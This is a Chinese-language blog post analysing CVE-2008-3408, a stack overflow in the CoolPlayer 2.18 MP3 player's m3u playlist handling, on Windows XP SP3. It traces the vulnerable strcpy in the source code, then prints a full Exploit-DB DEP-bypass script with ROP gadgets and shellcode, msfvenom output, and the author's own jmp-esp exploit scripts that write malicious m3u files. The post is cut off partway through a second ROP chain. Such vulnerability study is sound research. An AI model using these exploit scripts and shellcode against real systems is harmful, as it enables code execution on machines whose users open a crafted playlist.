@@ -1,0 +1,778 @@
+# CoolPlayer bypass DEP(CVE-2008-3408)分析
+
+阅读量 **233741**
+
+|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)
+
+发布时间 : 2018-12-08 10:00:58
+
+ **x**
+
+##### 译文声明
+
+本文是翻译文章
+
+译文仅供参考，具体内容表达以及含义原文为准。
+
+## 环境搭建
+
+CoolPlayer 是一款MP3播放软件，功能丰富，界面美观，十年前就已经停止更新，但直至现在依然还有人在下载使用
+
+![](https://raw.githubusercontent.com/xinali/img/master/blog/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CoolPlayer%20bypass%20DEP%20CVE-2008-3408%E5%88%86%E6%9E%90/1543929084412.png)
+
+根据[exploitdb](https://www.exploit-db.com/exploits/15895)，CoolPlayer
+2.18在处理`m3u`文件时，存在栈溢出，并且可以绕过`DEP`执行代码。
+
+根据[维基百科](https://zh.wikipedia.org/wiki/M3U)对`m3u`文件的解释
+
+    
+    
+    M3U文件是一种纯文本文件，可以指定一个或多个多媒体文件的位置，其文件扩展名是“M3U”或者“m3u”。
+    
+    M3U文件具有多个条目，每个条目的格式可以是以下几种格式之一：
+        一个绝对路径；比如：C:My MusicHeavysets.mp3
+        一个相对路径（相对于M3U文件的路径）；比如：Heavysets.mp3
+        一个URL
+    M3U文件也有注释，注释行以"#"字符开头，在扩展M3U文件中，"#"还引入了扩展M3U指令。
+    
+    M3U文件的作用通常是创建指向在线流媒体的播放列表，创建的文件可以轻松访问流媒体。M3U文件通常作为网站的下载资源、通过email收发，并可以收听网络电台。
+    
+    如果使用编辑器编辑M3U文件，必须将该文件用Windows-1252格式保存，这种格式是ASCII编码的超集。M3U文件也可以使用Latin-1字符编码。
+    
+
+简单点可以理解，`m3u`是是一种存放文件列表的文本文件(理解这个，对下面的分析很重要)。
+
+利用的`exploit`
+
+    
+    
+    # Exploit Title: CoolPlayer 2.18 DEP Bypass
+    # Date: January 2, 2011
+    # Author: Blake
+    # Version: 2.18
+    # Tested on: Windows XP SP3 running in Virtualbox
+    # Uses SetProcessDEPPolicy() to disable DEP for the process
+    # Thanks to mr_me for the encouragement
+    # Exploit-DB Notes: May not work on all Win XP SP3 machines
+    
+    print "n============================"
+    print "CoolPlayer 2.18 DEP Bypass"
+    print "Written by Blake"
+    print "============================n"
+    
+    # windows/exec calc.exe 227 bytes - 240 bytes of shellcode space available
+    shellcode =(
+    "xdaxdaxd9x74x24xf4xbfxe7x18x22xfbx2bxc9xb1x33"
+    "x5ex31x7ex17x83xeexfcx03x99x0bxc0x0ex99xc4x8d"
+    "xf1x61x15xeex78x84x24x3cx1excdx15xf0x54x83x95"
+    "x7bx38x37x2dx09x95x38x86xa4xc3x77x17x09xccxdb"
+    "xdbx0bxb0x21x08xecx89xeax5dxedxcex16xadxbfx87"
+    "x5dx1cx50xa3x23x9dx51x63x28x9dx29x06xeex6ax80"
+    "x09x3exc2x9fx42xa6x68xc7x72xd7xbdx1bx4ex9exca"
+    "xe8x24x21x1bx21xc4x10x63xeexfbx9dx6exeex3cx19"
+    "x91x85x36x5ax2cx9ex8cx21xeax2bx11x81x79x8bxf1"
+    "x30xadx4ax71x3ex1ax18xddx22x9dxcdx55x5ex16xf0"
+    "xb9xd7x6cxd7x1dxbcx37x76x07x18x99x87x57xc4x46"
+    "x22x13xe6x93x54x7ex6cx65xd4x04xc9x65xe6x06x79"
+    "x0exd7x8dx16x49xe8x47x53xabx19x5ax49x3cx80x0f"
+    "x30x20x33xfax76x5dxb0x0fx06x9axa8x65x03xe6x6e"
+    "x95x79x77x1bx99x2ex78x0exfaxb1xeaxd2xd3x54x8b"
+    "x71x2c")
+    
+    
+    buffer = "x41" * 220
+    eip = "x28xb0x9fx7c"                # POP ECX / RETN - SHELL32.DLL 7C9FB028
+    offset1 = "x42" * 4
+    nop = "x90" * 10
+    
+    # put zero in EBX
+    rop = "xddxadx9ex7c"                # POP EBX / RETN - SHELL32.DLL 7C9EADDD
+    rop += "xffxffxffxff"                # placed into ebx
+    rop += "xe1x27xc1x77"                # INC EBX / RETN - MSVCRT.DLL 77C127E1
+    
+    # set EBP to point to SetProcessDEPPolicy
+    rop += "x7bxa6x9ex7c"                # POP EBP / RETN - SHELL32.DLL 7C9EA67B
+    rop += "xa4x22x86x7c"                # address of SetProcessDEPPolicy XP SP3
+    
+    # set EDI as a pointer to RET (rop nop)
+    rop += "x47xebx9ex7c"                # POP EDI / RETN - SHELL32.DLL 7C9EEB47
+    rop += "x08x15x9cx7c"                # RETN - SHELL32.DLL 7C9C1508            
+    
+    # set ESI as a pointer to RET (rop nop)
+    rop += "x4cx20x9cx7c"                # POP ESI / RETN - SHELL32.DLL 7C9C204C
+    rop += "x51x20x9cx7c"                # RETN - SHELL32.DLL 7C9C2051            
+    
+    # set ESP to point at nops
+    rop += "x73x10xa1x7c"                # PUSHAD / RETN - SHELL32.DLL 7CA11073
+    
+    print "[*] Creating malicious m3u file"
+    try:
+        file = open("exploit.m3u","w")
+        file.write(buffer + eip + offset1 + rop + nop + shellcode)
+        file.close()
+        print "[*] File created"
+    except:
+        print "[x] Error creating file!"
+    
+    raw_input("nPress any key to exit...")
+    
+
+[软件地址(包含源码和二进制可执行程序)](https://sourceforge.net/projects/coolplayer/files/Coolplayer/218/)
+
+测试环境
+
+    
+    
+    windows cn xp sp3
+    windbg
+    vc 6.0
+    immunity debugger/mona.py
+    
+
+## 漏洞分析
+
+`mona`生成匹配串，之后利用`windbg`直接跑，可以发现溢出出错了
+
+![](https://raw.githubusercontent.com/xinali/img/master/blog/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CoolPlayer%20bypass%20DEP%20CVE-2008-3408%E5%88%86%E6%9E%90/1543929457421.png)
+
+但是这里有个很奇怪的一点，调用栈没用。无法根据调用栈回溯到出错位置。试了各种各样的办法，也确定了溢出长度为`260`，使用`264`长度的串，依然无法观察到。尝试查看所有线程的调用栈，看看是否能够发现什么
+
+![](https://raw.githubusercontent.com/xinali/img/master/blog/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CoolPlayer%20bypass%20DEP%20CVE-2008-3408%E5%88%86%E6%9E%90/1543929715178.png)
+
+其中唯独有关的位置`image00400000+0xdbd6(40dbd6)`，利用`IDA`查看，依然也没有发现
+
+![](https://raw.githubusercontent.com/xinali/img/master/blog/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CoolPlayer%20bypass%20DEP%20CVE-2008-3408%E5%88%86%E6%9E%90/1543929834991.png)
+
+由于分析经验不足，尝试了各种各样的方法，但是依然没有解决这个问题，找不到出错的位置。最后实在没有办法就想起了直接啃源码，这种比较笨拙的办法了。
+
+## 源码分析
+
+源码整体的框架
+
+![](https://raw.githubusercontent.com/xinali/img/master/blog/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CoolPlayer%20bypass%20DEP%20CVE-2008-3408%E5%88%86%E6%9E%90/1543930201381.png)
+
+是使用`VC6.0`这种上古神器编译的，其实也就可以知道了，是可以绕过`DEP`的，这里暂时不谈。
+
+`main.c`结构
+
+![](https://raw.githubusercontent.com/xinali/img/master/blog/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CoolPlayer%20bypass%20DEP%20CVE-2008-3408%E5%88%86%E6%9E%90/1543930393241.png)
+
+细看一下`WinMain`，是一个完整的`windows`消息处理程序，找到窗口处理过程，查看功能实现代码，其`WM_LBUTTONUP`实现了其窗口的各种功能，包括下一首，上一首，皮肤处理等等。
+
+    
+    
+    case WM_LBUTTONUP:
+            {
+                int     teller;
+                ReleaseCapture();
+                globals.main_bool_slider_keep_focus = FALSE;
+                cursorpos = MAKEPOINTS(lParam);
+    
+                for (teller = PlaySwitch; teller <= ExitButton; teller++)
+                {
+                    if (cursorpos.x >= Skin.Object[teller].x
+                            && cursorpos.y >= Skin.Object[teller].y
+                            && cursorpos.x <=
+                            Skin.Object[teller].x + Skin.Object[teller].w
+                            && cursorpos.y <=
+                            Skin.Object[teller].y + Skin.Object[teller].h)
+                    {
+                        switch (teller)
+                        {
+    
+                            case PlaySwitch:
+                                main_play_control(ID_PLAY, hWnd);
+                                break;
+    
+                            case PauseSwitch:
+                                main_play_control(ID_PAUSE, hWnd);
+                                break;
+    
+                            case StopSwitch:
+                                main_play_control(ID_STOP, hWnd);
+                                break;
+    
+                            case RepeatSwitch:
+                                main_play_control(ID_REPEAT, hWnd);
+                                break;
+    
+                            case ShuffleSwitch:
+                                main_play_control(ID_SHUFFLE, hWnd);
+                                break;
+    
+                            case EqSwitch:
+                                main_play_control(ID_EQUALIZER, hWnd);
+                                break;
+    
+                            case PlaylistButton:
+                                main_play_control(ID_PLAYLIST, hWnd);
+                                break;
+    
+                            case NextButton:
+                                main_play_control(ID_NEXT, hWnd);
+                                break;
+    
+                            case PrevButton:
+                                main_play_control(ID_PREVIOUS, hWnd);
+                                break;
+    
+                            case MinimizeButton:
+    
+                                if (options.show_on_taskbar)
+                                    ShowWindow(hWnd, SW_MINIMIZE);
+                                else
+                                    ShowWindow(hWnd, SW_HIDE);
+    
+                                break;
+    
+                            case NextSkinButton:
+                                main_play_control(ID_LOADSKIN, hWnd);
+    
+                                break;
+    
+                            case ExitButton:
+                                DestroyWindow(hWnd);
+    
+                                break;
+    
+                            case EjectButton:
+                                main_play_control(ID_LOAD, hWnd);
+    
+                                break;
+                        }
+                    }
+                }
+    
+                // options.show_remaining_time time
+    
+                if (cursorpos.x >= Skin.Object[TimeText].x
+                        && cursorpos.y >= Skin.Object[TimeText].y
+                        && cursorpos.x <=
+                        (Skin.Object[TimeText].x + (Skin.Object[TimeText].w * 8))
+                        && cursorpos.y <=
+                        (Skin.Object[TimeText].y + Skin.Object[TimeText].h))
+                {
+                    options.show_remaining_time = !options.show_remaining_time;
+                    main_draw_time(hWnd);
+                    break;
+                }
+    
+                main_draw_controls_all(hWnd);
+    
+                break;
+            }
+    
+
+跟我们最相关的是这里
+
+    
+    
+    case EjectButton:
+            main_play_control(ID_LOAD, hWnd);
+    
+
+跟进查看`ID_LOAD`的处理代码
+
+    
+    
+    int main_play_control(WORD wParam, HWND hWnd)
+    {
+        ...
+        case ID_LOAD:
+                CPVERB_OpenFile(vaDoVerb, hWnd);
+                break;
+        ...
+    }
+    
+
+继续跟进
+
+    
+    
+    void CPVERB_OpenFile(const CPe_VerbAction enAction, void* _pParam)
+    {
+        if (enAction == vaDoVerb)
+        {
+            if (playlist_open_file(TRUE))
+                CPL_PlayItem(globals.m_hPlaylist, TRUE, pmCurrentItem);
+        }
+    
+        else if (enAction == vaQueryName)
+        {
+            CPs_VerbQueryName* pParam = (CPs_VerbQueryName*)_pParam;
+    
+            if (stricmp(pParam->m_pcName, "OpenFile") == 0)
+                pParam->m_bNameMatched = TRUE;
+        }
+    }
+    
+
+其实联系上两步，可以发现`enAction == vaDoVerb`，因为`enAction`就是`vaDoVerb`
+
+跟进`playlist_open_file(TRUE)`
+
+    
+    
+    int playlist_open_file(BOOL clearlist)
+    {
+        OPENFILENAME fn;
+        char filefilter[] =
+            "All Supported files*.mp1;*.mp2;*.mp3;*.m3u;*.pls;*.wav;*.ogg"
+            "MPEG audio files (*.mp1;*.mp2;*.mp3)*.mp1;*.mp2;*.mp3"
+            "Vorbis files (*.ogg)*.ogg"
+            "Playlist files (*.m3u;*.pls)*.m3u;*.pls"
+            "WAV files (*.wav)*.wav"
+            "All Files (*.*)*.*";
+        ...
+        returnval = GetOpenFileName(&fn);
+    
+        if (returnval != FALSE)
+        {
+            char   *newfilename;
+            char    path_buffer[_MAX_PATH];
+            char    path_buffer2[_MAX_PATH];
+    
+            if (clearlist)
+                CPL_Empty(globals.m_hPlaylist);
+    
+            strcpy(path_buffer, fn.lpstrFile);
+    
+            if (path_is_directory(fn.lpstrFile) == TRUE)
+            {
+                path_add_backslash(path_buffer);
+            }
+    
+            else
+            {
+                path_remove_filespec(path_buffer);
+            }
+    
+            strcpy(options.last_used_directory, path_buffer);
+    
+            newfilename = fn.lpstrFile + fn.nFileOffset;
+    
+            while (newfilename[0] != 0)
+            {
+                strcpy(path_buffer2, path_buffer);
+                strcat(path_buffer2, newfilename);
+                CPL_SyncLoadNextFile(globals.m_hPlaylist);
+                CPL_AddFile(globals.m_hPlaylist, path_buffer2);
+                newfilename = newfilename + strlen(newfilename) + 1;
+            }
+            return 1;
+        }
+        return 0;
+    }
+    
+
+其主要的功能就是
+
+  1. 设置可以打开的文件后缀白名单
+  2. 获取打开的文件名
+  3. 构建文件的绝对路径名
+
+根据分析，函数`CPL_AddFile`会根据绝对路径名去处理文件，继续跟进。该函数首先会判断文件的类型，获取文件的大小，获取文件目录字符串长度等，再根据不同的类型进入不同的分支进行处理，而且还可以从网络上下载文件进行处理。从`1249`行去处理`m3u`文件。
+
+    
+    
+    void CPL_AddFile(CP_HPLAYLIST hPlaylist, const char* pcFilename)
+    {
+        ...
+        // Check for known file types
+        enFileType = CPL_GetFileType(pcFilename);
+    
+        ...
+    
+        // Get playlist file information
+        iPlaylist_VolumeBytes = CPL_GetPathVolumeBytes(pcFilename);
+        iPlaylist_DirectoryBytes = CPL_GetPathDirectoryBytes(pcFilename, iPlaylist_VolumeBytes); // 这里很重要！！！！
+        ...
+    
+        // 开始处理m3u文件
+        // It's not a URL, so we will read the file from a local (UNC) resource
+        hFile = CreateFile(pcFilename, GENERIC_READ, FILE_SHARE_READ, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+    
+        if (hFile != INVALID_HANDLE_VALUE)
+        {
+            const DWORD dwFileSize = GetFileSize(hFile, NULL);
+    
+            // We will only load playlists that are smaller than 256K
+    
+            if (dwFileSize < 0x40000)
+            {
+                // The plan is to load the entire file into a memblock and then split it into lines
+                // and scan off the whitepace and add the items to the list
+                pcPlaylistBuffer = (char *)malloc(dwFileSize + 1);
+                ReadFile(hFile, pcPlaylistBuffer, dwFileSize, &dwBytesRead, NULL);
+    
+                // Read in the file line by line
+                iLastLineStartIDX = 0;
+    
+                for (iCharIDX = 0; iCharIDX < dwFileSize + 1; iCharIDX++)
+                {
+                    if ((pcPlaylistBuffer[iCharIDX] == 'r' || pcPlaylistBuffer[iCharIDX] == 'n' || iCharIDX == dwFileSize) && iLastLineStartIDX < iCharIDX)
+                    {
+                        char cBuffer[512];
+    
+                        // Is there a file on this line (strip whitespace from start)
+    
+                        if (sscanf(pcPlaylistBuffer + iLastLineStartIDX, " %512[^rn]", cBuffer) == 1)
+                        {
+                            // Something has been read - ignore lines starting with #
+                            if (cBuffer[0] != '#')
+                                CPL_AddPrefixedFile(hPlaylist, cBuffer, NULL, pcFilename, iPlaylist_VolumeBytes, iPlaylist_DirectoryBytes);
+                        }
+    
+                        // Set the line start for the next line
+    
+                        if (pcPlaylistBuffer[iCharIDX + 1] == 'n')
+                            iCharIDX++;
+    
+                        iLastLineStartIDX = iCharIDX + 1;
+                    }
+                }
+    
+                free(pcPlaylistBuffer);
+            }
+    
+            CloseHandle(hFile);
+        }
+    
+
+其中`for`循环，根据列表文件，一次处理一行，由于代码量比较大，并且这块的处理逻辑很重要，我截一个图，再做一些标注，好方便理解。
+
+![](https://raw.githubusercontent.com/xinali/img/master/blog/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CoolPlayer%20bypass%20DEP%20CVE-2008-3408%E5%88%86%E6%9E%90/1543933158203.png)
+
+跟进函数`CPL_AddPrefixedFile`
+
+    
+    
+    void CPL_AddPrefixedFile(CP_HPLAYLIST hPlaylist,
+                             const char* pcFilename, const char* pcTitle,
+                             const char* pcPlaylistFile,
+                             const unsigned int iPlaylist_VolumeBytes,
+                             const unsigned int iPlaylist_DirBytes)
+    {
+        const unsigned int iFile_VolumeBytes = CPL_GetPathVolumeBytes(pcFilename);
+    
+        // If the file has volume information - add it as it is
+    
+        if (iFile_VolumeBytes)
+            CPL_AddSingleFile(hPlaylist, pcFilename, pcTitle);
+    
+        // If the filename has a leading  then add it prepended by the playlist's volume
+        else if (pcFilename[0] == '\')
+        {
+            char cFullPath[MAX_PATH];
+            memcpy(cFullPath, pcPlaylistFile, iPlaylist_VolumeBytes);
+            strcpy(cFullPath + iPlaylist_VolumeBytes, pcFilename + 1);
+            CPL_AddSingleFile(hPlaylist, cFullPath, pcTitle);
+        }
+    
+        // Add the filename prepended by the playlist's directory
+    
+        else
+        {
+            char cFullPath[MAX_PATH];
+            memcpy(cFullPath, pcPlaylistFile, iPlaylist_DirBytes);
+            strcpy(cFullPath + iPlaylist_DirBytes, pcFilename); // 溢出位置
+            CPL_AddSingleFile(hPlaylist, cFullPath, pcTitle);
+        }
+    }
+    
+
+根据分析，最后执行的会是这里
+
+    
+    
+    char cFullPath[MAX_PATH];
+    memcpy(cFullPath, pcPlaylistFile, iPlaylist_DirBytes);
+    strcpy(cFullPath + iPlaylist_DirBytes, pcFilename);
+    CPL_AddSingleFile(hPlaylist, cFullPath, pcTitle);
+    
+
+首先定义绝对路径字符串，`MAX_PATH`定义
+
+    
+    
+    #ifndef MAX_PATH
+    #define MAX_PATH 1024
+    #endif
+    
+
+这里其实`windows`定义了`MAX_PATH`，值为`260`，具体可以参考[stackoverflow的讨论](https://stackoverflow.com/questions/1880321/why-does-the-260-character-path-length-limit-exist-in-windows)，从`ida`逆向代码也可以验证这个结果，这里也决定了最长长度只要超过`260`，肯定会导致溢出
+
+![](https://raw.githubusercontent.com/xinali/img/master/blog/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CoolPlayer%20bypass%20DEP%20CVE-2008-3408%E5%88%86%E6%9E%90/1543933914382.png)
+
+第二步，复制目录长度大小的数据到数组中
+
+这步很关键，我在测试中，会将测试的`m3u`放在很多不同的目录下，比如桌面，c盘，导致溢出长度不停的变化，我也没有理解为什么。从源码中，可以发现目录的长度是占用溢出字符空间的！这也就导致了不同目录长度，`m3u`文件肯定不同。经过测试，`m3u`文件放在c盘根目录，溢出长度正好是`260`。
+
+第三步，将`pcFilename`利用`strcpy`复制到`cFullPath`中，而`cFullPath`是从函数`CPL_AddFile`中读取出来的`cBuffer`，也就是`m3u`中的每行数据。之后
+
+    
+    
+    void CPL_AddSingleFile(CP_HPLAYLIST hPlaylist, const char* pcPath, const char* pcTitle)
+    
+
+并不会改变`cFullPath`的数据，到这里栈溢出导致的漏洞原因分析清楚了。
+
+## 漏洞利用
+
+###  jmp esp
+
+首先使用`msfvenom`生成`shellcode`
+
+    
+    
+    root@kali32:~# msfvenom -a x86 --platform windows -p windows/exec cmd=calc -b "x00x0ax0d" -f python
+    Found 11 compatible encoders
+    Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
+    x86/shikata_ga_nai succeeded with size 284 (iteration=0)
+    x86/shikata_ga_nai chosen with final size 284
+    Payload size: 220 bytes
+    Final size of python file: 1366 bytes
+    buf =  ""
+    buf += "xdbxdaxd9x74x24xf4xbfx2fx93x9dx5cx58x2b"
+    buf += "xc9xb1x30x31x78x18x83xe8xfcx03x78x3bx71"
+    buf += "x68xa0xabxf7x93x59x2bx98x1axbcx1ax98x79"
+    buf += "xb4x0cx28x09x98xa0xc3x5fx09x33xa1x77x3e"
+    buf += "xf4x0cxaex71x05x3cx92x10x85x3fxc7xf2xb4"
+    buf += "x8fx1axf2xf1xf2xd7xa6xaax79x45x57xdfx34"
+    buf += "x56xdcx93xd9xdex01x63xdbxcfx97xf8x82xcf"
+    buf += "x16x2dxbfx59x01x32xfax10xbax80x70xa3x6a"
+    buf += "xd9x79x08x53xd6x8bx50x93xd0x73x27xedx23"
+    buf += "x09x30x2ax5exd5xb5xa9xf8x9ex6ex16xf9x73"
+    buf += "xe8xddxf5x38x7exb9x19xbex53xb1x25x4bx52"
+    buf += "x16xacx0fx71xb2xf5xd4x18xe3x53xbax25xf3"
+    buf += "x3cx63x80x7fxd0x70xb9xddxbex87x4fx58x8c"
+    buf += "x88x4fx63xa0xe0x7exe8x2fx76x7fx3bx14x88"
+    buf += "x35x66x3cx01x90xf2x7dx4cx23x29x41x69xa0"
+    buf += "xd8x39x8exb8xa8x3cxcax7ex40x4cx43xebx66"
+    buf += "xe3x64x3ex05x62xf7xa2xca"
+    
+
+生成`exploit`
+
+    
+    
+    dump = 'x41' * 260
+    EIP = 'x53x93xd2x77' #jmp esp address
+    
+    buf =  ""
+    buf += "xdbxdaxd9x74x24xf4xbfx2fx93x9dx5cx58x2b"
+    buf += "xc9xb1x30x31x78x18x83xe8xfcx03x78x3bx71"
+    buf += "x68xa0xabxf7x93x59x2bx98x1axbcx1ax98x79"
+    buf += "xb4x0cx28x09x98xa0xc3x5fx09x33xa1x77x3e"
+    buf += "xf4x0cxaex71x05x3cx92x10x85x3fxc7xf2xb4"
+    buf += "x8fx1axf2xf1xf2xd7xa6xaax79x45x57xdfx34"
+    buf += "x56xdcx93xd9xdex01x63xdbxcfx97xf8x82xcf"
+    buf += "x16x2dxbfx59x01x32xfax10xbax80x70xa3x6a"
+    buf += "xd9x79x08x53xd6x8bx50x93xd0x73x27xedx23"
+    buf += "x09x30x2ax5exd5xb5xa9xf8x9ex6ex16xf9x73"
+    buf += "xe8xddxf5x38x7exb9x19xbex53xb1x25x4bx52"
+    buf += "x16xacx0fx71xb2xf5xd4x18xe3x53xbax25xf3"
+    buf += "x3cx63x80x7fxd0x70xb9xddxbex87x4fx58x8c"
+    buf += "x88x4fx63xa0xe0x7exe8x2fx76x7fx3bx14x88"
+    buf += "x35x66x3cx01x90xf2x7dx4cx23x29x41x69xa0"
+    buf += "xd8x39x8exb8xa8x3cxcax7ex40x4cx43xebx66"
+    buf += "xe3x64x3ex05x62xf7xa2xca"
+    
+    fp = open("jmp_esp.m3u", "w") 
+    fp.write(dump + EIP + buf)
+    fp.close()
+    
+
+放在c盘下，打开文件测试
+
+![](https://raw.githubusercontent.com/xinali/img/master/blog/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CoolPlayer%20bypass%20DEP%20CVE-2008-3408%E5%88%86%E6%9E%90/1544020310524.png)
+
+`shellcode`竟然崩了，用`windbg`检查
+
+![](https://raw.githubusercontent.com/xinali/img/master/blog/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CoolPlayer%20bypass%20DEP%20CVE-2008-3408%E5%88%86%E6%9E%90/1544020492827.png)
+
+在返回前`40c9b6`设下断点，进入`shellcode`调试看看到底哪里出现了问题
+
+![](https://raw.githubusercontent.com/xinali/img/master/blog/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CoolPlayer%20bypass%20DEP%20CVE-2008-3408%E5%88%86%E6%9E%90/1544020601257.png)
+
+`shellcode`开始处代码
+
+    
+    
+    0:000> u esp
+    <Unloaded_ud.drv>+0x122203:
+    00122204 dbda            fcmovnu st,st(2)
+    00122206 d97424f4        fnstenv [esp-0Ch]
+    0012220a bf2f939d5c      mov     edi,5C9D932Fh
+    0012220f 58              pop     eax
+    00122210 2bc9            sub     ecx,ecx
+    00122212 b130            mov     cl,30h
+    00122214 317818          xor     dword ptr [eax+18h],edi
+    00122217 83e8fc          sub     eax,0FFFFFFFCh
+    
+
+继续调试
+
+![](https://raw.githubusercontent.com/xinali/img/master/blog/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CoolPlayer%20bypass%20DEP%20CVE-2008-3408%E5%88%86%E6%9E%90/1544020808323.png)
+
+可以发现执行完`fnstenv [esp-0Ch]`，原先的`shellcode`指令已经被改写了。
+
+继续执行，出错了
+
+![](https://raw.githubusercontent.com/xinali/img/master/blog/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CoolPlayer%20bypass%20DEP%20CVE-2008-3408%E5%88%86%E6%9E%90/1544020912924.png)
+
+其实这里花了很长时间搞清楚到底怎么回事，因为`shellcode`是通过`msfvenom`生成的，正常情况下，不应该出现这样的问题。`shellcode`竟然将自己的代码空间栈改写了。经过长时间的搜索，发现了问题所在
+
+在这本[书](https://books.google.com/books?id=sEobCgAAQBAJ&pg=PA77&lpg=PA77&dq=fnstenv+%5Besp-0Ch%5D&source=bl&ots=pCoAeaJQuQ&sig=1RR3SlhA1CK0IX_TwJ1wKtzql5o&hl=en&sa=X&ved=2ahUKEwjiwIiv64jfAhXIwMQHHXDoDngQ6AEwEXoECAMQAQ#v=onepage&q=fnstenv%20%5Besp-0Ch%5D&f=false)里，提到了这个问题
+
+![](https://raw.githubusercontent.com/xinali/img/master/blog/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CoolPlayer%20bypass%20DEP%20CVE-2008-3408%E5%88%86%E6%9E%90/1544021089483.png)
+
+大概的意思就是`fnstenv
+[esp-0Ch]`会改写从`esp-0ch`开始的`28`字节数据，所以为了保证从`esp`开始的数据不被重写，重新生成`exploit`文件
+
+    
+    
+    dump = 'x41' * 260
+    EIP = 'x53x93xd2x77' #jmp esp address
+    
+    buf =  ""
+    buf += "xdbxdaxd9x74x24xf4xbfx2fx93x9dx5cx58x2b"
+    buf += "xc9xb1x30x31x78x18x83xe8xfcx03x78x3bx71"
+    buf += "x68xa0xabxf7x93x59x2bx98x1axbcx1ax98x79"
+    buf += "xb4x0cx28x09x98xa0xc3x5fx09x33xa1x77x3e"
+    buf += "xf4x0cxaex71x05x3cx92x10x85x3fxc7xf2xb4"
+    buf += "x8fx1axf2xf1xf2xd7xa6xaax79x45x57xdfx34"
+    buf += "x56xdcx93xd9xdex01x63xdbxcfx97xf8x82xcf"
+    buf += "x16x2dxbfx59x01x32xfax10xbax80x70xa3x6a"
+    buf += "xd9x79x08x53xd6x8bx50x93xd0x73x27xedx23"
+    buf += "x09x30x2ax5exd5xb5xa9xf8x9ex6ex16xf9x73"
+    buf += "xe8xddxf5x38x7exb9x19xbex53xb1x25x4bx52"
+    buf += "x16xacx0fx71xb2xf5xd4x18xe3x53xbax25xf3"
+    buf += "x3cx63x80x7fxd0x70xb9xddxbex87x4fx58x8c"
+    buf += "x88x4fx63xa0xe0x7exe8x2fx76x7fx3bx14x88"
+    buf += "x35x66x3cx01x90xf2x7dx4cx23x29x41x69xa0"
+    buf += "xd8x39x8exb8xa8x3cxcax7ex40x4cx43xebx66"
+    buf += "xe3x64x3ex05x62xf7xa2xca"
+    
+    junk = 'x41' * 20
+    fp = open("jmp_esp.m3u", "w") 
+    fp.write(dump + EIP + junk + buf)
+    fp.write(buf)
+    fp.close()
+    
+
+成功弹窗
+
+![](https://raw.githubusercontent.com/xinali/img/master/blog/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CoolPlayer%20bypass%20DEP%20CVE-2008-3408%E5%88%86%E6%9E%90/1544021715834.png)
+
+这里还有一点需要注意，如果有想使用`MessageBox`弹窗的，并且利用`msfvenom`生成`shellcode`，会造成弹窗失败
+
+![](https://raw.githubusercontent.com/xinali/img/master/blog/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CoolPlayer%20bypass%20DEP%20CVE-2008-3408%E5%88%86%E6%9E%90/1544021837761.png)
+
+可以注意一下`payload`的长度为`284`字节，加上溢出长度`260`字节，总长度是`544`字节，查看源码
+
+    
+    
+     if(sscanf(pcPlaylistBuffer + iLastLineStartIDX, " %512[^rn]", cBuffer) == 1) <====
+     {
+         // Something has been read - ignore lines starting with #
+         if(cBuffer[0] != '#')
+             CPL_AddPrefixedFile(hPlaylist, cBuffer, NULL, pcFilename, iPlaylist_VolumeBytes, iPlaylist_DirectoryBytes);
+     }
+    
+
+可以看到`cBuffer`最大长度不会超过`512`，超过的话`shellcode`就会被截断。
+
+测试一下
+
+![](https://raw.githubusercontent.com/xinali/img/master/blog/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CoolPlayer%20bypass%20DEP%20CVE-2008-3408%E5%88%86%E6%9E%90/1544022453105.png)
+
+可以看到`shellcode`确实被截断了。
+
+###  bypass DEP
+
+利用`SetProcessDepProcy`绕过`DEP`
+
+    
+    
+    #encoding:utf-8
+    
+    import struct
+    
+    dump = 'x90' * 260
+    
+    ROP = ''
+    ROP += struct.pack('<L',0x7711ab55) # POP EBX / RET
